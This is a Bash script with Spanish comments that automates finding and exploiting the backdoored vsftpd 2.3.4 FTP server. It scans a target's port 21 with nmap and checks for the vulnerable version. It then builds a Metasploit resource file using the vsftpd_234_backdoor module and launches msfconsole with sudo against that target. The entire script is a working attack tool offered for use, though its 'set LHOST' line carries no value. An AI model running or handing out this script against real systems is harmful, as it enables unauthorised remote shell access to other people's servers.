#!/bin/bash
# ==============================================================================
# Automatización de Detección y Explotación vsftpd 2.3.4 (Versión Pro)
# ==============================================================================

# 1. Captura dinámica del objetivo (IP fija por defecto o pasada por argumento)
TARGET_IP="${1:-192.168.1.10}"
REPORTE_FTP="nmap_ftp_${TARGET_IP}.txt"

echo -e "\e[34m[*] Verificando servicio FTP en: $TARGET_IP...\e[0m"

# 2. Escaneo preciso de servicio y versión en el puerto 21
nmap -sV -p 21 -oN "$REPORTE_FTP" "$TARGET_IP" > /dev/null 2>&1

# 3. Búsqueda inteligente (insensible a mayúsculas/minúsculas con -i)
grep -iq "vsftpd 2.3.4" "$REPORTE_FTP"

if [ $? -eq 0 ]; then
    echo -e "\e[31m[+] ¡ALERTA! Servicio VSFTPD 2.3.4 (Backdoor) detectado en $TARGET_IP.\e[0m"
    echo -e "\e[33m[*] Generando script de automatización para Metasploit...\e[0m"
    
    # 4. Creación de un archivo de recursos (.rc) para automatizar Metasploit
    CATALOGO_MSF="exploit_vsftpd.rc"
    {
        echo "use exploit/unix/ftp/vsftpd_234_backdoor"
        echo "set RHOSTS $TARGET_IP"
        echo "set LHOST"  # Configura automáticamente payloads genéricos si aplica
        echo "exploit"
    } > "$CATALOGO_MSF"
    
    echo -e "\e[32m[*] Lanzando Metasploit Framework con el exploit...\e[0m"
    echo "----------------------------------------------------------------------"
    
    # Ejecuta Metasploit usando el archivo de comandos automatizado creado arriba
    sudo msfconsole -r "$CATALOGO_MSF"
    
    # Limpieza del archivo temporal al terminar la sesión de Metasploit
    rm -f "$CATALOGO_MSF"
else
    echo -e "\e[32m[-] Servicio VSFTPD 2.3.4 no detectado o puerto cerrado. Operación abortada.\e[0m"
    rm -f "$REPORTE_FTP"
    exit 1
fi
